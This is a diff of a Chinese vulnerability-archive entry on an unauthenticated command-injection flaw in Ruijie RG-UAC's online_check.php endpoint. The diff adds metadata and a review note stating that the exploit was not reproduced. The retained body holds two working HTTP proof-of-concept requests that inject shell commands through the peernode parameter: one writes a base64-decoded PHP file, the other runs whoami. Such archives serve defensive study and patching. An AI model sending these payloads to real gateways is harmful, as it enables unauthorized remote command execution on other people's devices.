@@ -1,9 +1,54 @@
 ---
-
 source: "wy876 漏洞文库"
+id: "vw-f66c00426db31ccbd5be11f5"
+entity_id: "ve-f66c00426db31ccbd5be11f5"
+schema_version: "1"
+title: "锐捷RG-UAC应用网关online_check.php前台RCE漏洞"
+product: "Ruijie RG-UAC"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "声称未认证，版本未知；写目录/PHP解析条件"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3online_check.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E.md"
+review_date: "2026-10-02"
+side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/ektr1dwcngu6c0ct"
+source_status: "recorded"
 ---
 
 # 锐捷RG-UAC应用网关online_check.php前台RCE漏洞
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：Ruijie RG-UAC
+- 本文讨论：online_check.php peernode命令替换
+- 版本、权限与配置前提：声称未认证，版本未知；写目录/PHP解析条件
+- 资料类型：前台命令注入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- iii:0,hit:0只能是可达指纹，正文已谨慎称可能，不应升为确证
+- Base64生成PHP自删除文件与whoami文件两种副作用不同，后者无清理
+- 回读路径已给但无结果/源码；URL内原始反引号需说明传输编码
+- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
+
+### 待核与来源
+
+- 鉴权/固件与有效输出待核
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 ### 一、漏洞描述
 <font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关 online_check.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font>
@@ -31,7 +76,7 @@ iii:0,hit:0
 
 通过以下poc写入文件
 
-```java
+```http
 GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==%20|%20base64%20-d%20%3E%20test.php` HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
@@ -58,7 +103,7 @@ Upgrade-Insecure-Requests: 1
 
 通过如下poc执行命令
 
-```java
+```http
 GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`whoami%20>%201.txt` HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
